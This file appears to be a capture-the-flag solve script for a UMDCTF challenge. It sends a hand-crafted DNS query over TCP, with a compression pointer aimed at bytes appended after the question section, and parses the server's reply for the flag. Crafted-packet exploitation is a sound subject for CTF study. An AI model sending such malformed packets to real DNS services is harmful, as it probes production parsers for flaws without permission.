# solve.py
import socket
import sys
import re

HOST = "challs.umdctf.io"
PORT = 32301

# DNS Query Packet using compression pointer
# QNAME = \x06tiktok\xc0\x1a (points to offset 26)
# Target at offset 26 = \x03com\x00
header = b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00' # Offset 0-11
qname_part1 = b'\x06tiktok' # Offset 12-18
pointer = b'\xc0\x1a'       # Offset 19-20 (Points to 26)
qtype = b'\x00\x10'          # Offset 21-22 (TXT)
qclass = b'\x00\x01'         # Offset 23-24 (IN)
padding = b'\x00'           # Offset 25
pointer_target = b'\x03com\x00' # Offset 26-30

query_payload = header + qname_part1 + pointer + qtype + qclass + padding + pointer_target

# Calculate size and format as 4 bytes big-endian
size = len(query_payload)
size_bytes = size.to_bytes(4, byteorder='big')

print(f"[*] Target: {HOST}:{PORT}")
print(f"[*] Querying using compression pointer")
print(f"[*] Payload size: {size} bytes")
print(f"[*] Size prefix: {size_bytes.hex()}")
print(f"[*] Payload hex: {query_payload.hex()}")

try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        # Set a timeout for socket operations
        s.settimeout(10) # 10 seconds
        print(f"[*] Connecting to {HOST}:{PORT}...")
        s.connect((HOST, PORT))
        print(f"[*] Connected.")

        # Send size prefix
        s.sendall(size_bytes)
        print(f"[*] Sent size prefix.")

        # Send DNS query
        s.sendall(query_payload)
        print(f"[*] Sent query payload.")

        # Receive response
        print("[*] Receiving response...")
        response = b""
        try:
            # Keep reading until the server closes the connection or timeout
            while True:
                chunk = s.recv(4096) 
                if not chunk:
                    break # Connection closed by server
                response += chunk
        except socket.timeout:
             print("[!] Socket timeout during receive. Processing partial response.")
        except Exception as recv_err:
             print(f"[!] Error during receive: {recv_err}. Processing partial response.")


        print(f"[*] Received {len(response)} bytes.")
        if not response:
             print("[!] Empty response received.")
        else:
            print("[*] Raw Response Hex:")
            print(response.hex())

            # Attempt to decode printable parts
            try:
                printable_response = ''.join(chr(b) if 32 <= b < 127 else '.' for b in response)
                print("\n[*] Printable Response:")
                print(printable_response)
            except Exception as e:
                 print(f"[!] Error decoding response: {e}")

            # Look for the flag format UMDCTF{...} directly
            flag_found = False
            direct_match = re.search(rb'UMDCTF\{[^\}]+\}', response)
            if direct_match:
                flag = direct_match.group(0).decode()
                print(f"\n[+] Flag found directly: {flag}")
                flag_found = True
            
            # If not found directly, try parsing the answer section RDATA
            if not flag_found:
                print("\n[*] Trying to parse DNS Answer RDATA...")
                try:
                    # Find start of Answer section (usually after Question section)
                    # Question Section = QNAME (compressed) + QTYPE + QCLASS
                    # Our compressed QNAME was 9 bytes
                    q_section_len = 9 + 2 + 2 
                    header_len = 12
                    answer_start_index = header_len + q_section_len # Should be offset 25?
                    
                    # We added padding and target data after question, real answer starts after that
                    # Let's just search the whole response after header for the answer pattern
                    answer_start_search_offset = 12 # Start searching after header

                    if len(response) > answer_start_search_offset:
                        # Look for the Answer RR: Name (pointer \xc0\x0c often points back to QNAME start), Type TXT, Class IN
                        # Pointer \xc0\x0c refers to offset 12
                        answer_pattern = rb'\xc0\x0c\x00\x10\x00\x01' # Pointer to QNAME + TXT + IN
                        match = re.search(answer_pattern, response[answer_start_search_offset:], re.DOTALL)
                        
                        if match:
                            # Found the start of the answer RR header (after pointer)
                            rr_header_start = answer_start_search_offset + match.start() + 2 # Start after pointer
                            
                            if rr_header_start + 10 <= len(response): # Need Type, Class, TTL, RDLENGTH (2+2+4+2=10)
                                rdlength_bytes = response[rr_header_start+8:rr_header_start+10]
                                rdlength = int.from_bytes(rdlength_bytes, 'big')
                                rdata_start = rr_header_start + 10
                                
                                if rdata_start + rdlength <= len(response):
                                    rdata = response[rdata_start : rdata_start + rdlength]
                                    print(f"[*] Found RDATA (length {rdlength}): {rdata.hex()}")
                                    # TXT RDATA is one or more <length_byte><string>
                                    current_pos = 0
                                    while current_pos < len(rdata):
                                        txt_len = rdata[current_pos]
                                        current_pos += 1
                                        if current_pos + txt_len <= len(rdata):
                                            txt_data = rdata[current_pos : current_pos + txt_len]
                                            print(f"[*]   Parsed TXT string (len {txt_len}): {txt_data}")
                                            try:
                                                 decoded_txt = txt_data.decode()
                                                 print(f"[*]     Decoded: {decoded_txt}")
                                                 if decoded_txt.startswith("UMDCTF{") and decoded_txt.endswith("}"):
                                                      print(f"\n[+] Flag found in RDATA: {decoded_txt}")
                                                      flag_found = True
                                                      break # Found the flag
                                            except UnicodeDecodeError:
                                                 print("[*]     Cannot decode TXT string as UTF-8/ASCII.")
                                            current_pos += txt_len
                                        else:
                                            print("[!] Invalid TXT length byte in RDATA.")
                                            break
                                else:
                                     print("[!] RDATA length exceeds response boundary.")
                            else:
                                 print("[!] Response too short for full Answer RR header.")
                        else:
                            print(f"[!] Could not find Answer RR pattern ({answer_pattern.hex()}) after offset {answer_start_search_offset}.")
                    else:
                        print("[!] Response too short to contain Answer section.")

                except Exception as parse_err:
                    print(f"[!] Error parsing DNS response: {parse_err}")

            if not flag_found:
                 print("\n[-] Flag pattern not found.")


except socket.timeout:
    print("[!] Connection timed out.")
except ConnectionRefusedError:
    print(f"[!] Connection refused by {HOST}:{PORT}. Server might be down or incorrect address/port.")
except Exception as e:
    print(f"[!] An unexpected error occurred: {e}") 